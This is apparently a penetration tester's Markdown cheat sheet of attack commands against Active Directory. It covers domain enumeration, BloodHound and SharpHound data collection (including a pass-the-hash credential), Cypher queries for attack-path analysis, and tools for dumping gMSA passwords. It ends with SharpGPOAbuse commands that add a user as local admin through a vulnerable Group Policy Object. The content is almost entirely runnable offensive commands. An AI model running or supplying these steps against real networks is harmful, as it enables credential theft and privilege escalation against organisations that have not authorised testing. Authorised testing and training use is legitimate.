### Basic Enum
```
reg query "HKLM\System\CurrentControlSet\Services\Tcpip\Parameters" /v "Domain"
net user /domain
net user NameOfUser /domain
net group /domain
net group "NameOfGroup" /domain
net accounts
```
### BloodHound
###### Attacker
```
bloodhound-python -d domain.com -u "User" -p "Password" -c all --zip -ns $IP
bloodhound-python -d domain.com -u "User" --hashes ":8846F7EAEE8FB117AD06BDD830B7586C" -c all --zip -ns $IP
sudo neo4j start
bloodhound
upload zip
```
###### Victim
```
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory /temp -ZipFileName loot.zip
```
### Custom Queries
###### List computers
```
MATCH (m:Computer) RETURN m
```
###### List Users
```
MATCH (m:User) RETURN m
```
###### List Sessions
```
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```
## Outbound Object Control
### ReadGMSAPassword
###### Remote
```
 python gMSADumper.py -u 'user' -p 'password' -d 'domain.local'
```
###### Local
```
.\GMSAPasswordReader.exe --AccountName 'Target_Account'
```
### Group Policy Object (GPO)
```
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob.smith --GPOName "Vulnerable GPO"
gpupdate /force
```
